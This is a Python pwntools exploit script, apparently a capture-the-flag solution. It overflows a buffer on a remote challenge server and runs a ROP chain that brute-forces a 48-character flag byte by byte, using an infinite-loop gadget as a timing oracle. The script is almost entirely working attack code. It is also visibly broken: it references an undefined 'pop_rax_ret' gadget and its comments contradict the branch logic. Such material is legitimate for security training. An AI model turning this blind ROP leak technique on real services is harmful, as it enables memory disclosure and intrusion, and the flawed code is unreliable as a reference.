from pwn import *

context.arch = 'amd64'

flag_addr = 0x4de2e0
pop_r14_ret = 0x402797
mov_eax_dword_ptr_rax_ret = 0x4022ee
cmp_al_r14b_ret = 0x438c15
jne_0x426148_ret = 0x426159

pop_rbx_ret = 0x401fa2
jmp_rbx = 0x4176fd
infinite_loop = p64(pop_rbx_ret) + p64(jmp_rbx) + p64(jmp_rbx)

flag = ''
idx = 0
while idx < 48:
    guess = 0x20
    while guess < 0x80 :
        # r = process('./chal')
        r = remote('edu-ctf.zoolab.org', 10012)
        ROP = flat(
            pop_rax_ret, flag_addr+idx,
            mov_eax_dword_ptr_rax_ret,
            pop_r14_ret, guess,
            cmp_al_r14b_ret, 
            jne_0x426148_ret,
        )
        ROP += infinite_loop
        
        r.sendafter(b'rop\n',b'a'*0x28 + ROP)
        try :
            # If compare not correct, guess++ and access to infinity loop
            r.recv(timeout=0.5)
            break
        except:
            # If compare correct, pwntool will break out
            guess += 1
        r.close()
    
    idx += 1
    flag += chr(guess)
    print(flag)
print(flag)

r.interactive()